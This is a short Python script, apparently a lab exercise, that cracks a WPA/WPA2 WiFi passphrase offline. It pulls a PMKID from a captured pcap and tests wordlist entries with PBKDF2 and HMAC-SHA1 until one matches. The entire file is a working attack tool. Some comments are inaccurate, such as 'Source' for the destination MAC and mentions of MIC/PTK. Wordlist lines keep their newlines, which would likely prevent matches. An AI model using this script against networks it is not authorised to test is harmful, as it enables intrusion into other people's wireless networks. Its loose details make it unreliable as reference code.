import hashlib, hmac
from pbkdf2 import *
from binascii import a2b_hex, b2a_hex, hexlify

from scapy.all import *


def main():
    wpa = rdpcap("./PMKID_handshake.pcap")

    ssid = wpa[144].info
    AP_mac = a2b_hex(wpa[145].addr2.replace(':', '').lower())  # Get AP mac address from Source of the first packet of the 4-way handshake
    client_mac = a2b_hex(wpa[145].addr1.replace(':', '').lower())  # Get STA mac address  from Source of the first packet of the 4-way handshake
    pmkid_to_test = hexlify(wpa[145].load)[202:234]

    # Get dictionary for testing passPhrase
    with open("wordlist") as f:
        dico = f.readlines()

    for word in dico:
        # Get one possible passhprase from the dictionary
        passPhrase = str.encode(word)

        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        pmk = a2b_hex(PBKDF2(passPhrase, ssid, 4096).hexread(32))
        pmk_name = "PMK Name".encode()
        # calculate our own MIC over EAPOL payload - The ptk is, in fact, KCK|KEK|TK|MICK
        pmkid = str.encode(hmac.new(pmk, pmk_name + AP_mac + client_mac, hashlib.sha1).hexdigest()[:32])

        if pmkid_to_test == pmkid:
            print("Pass phrase found! It's \"%s\"." % word)
            exit(0)


if __name__ == "__main__":
    # execute only if run as a script
    main()
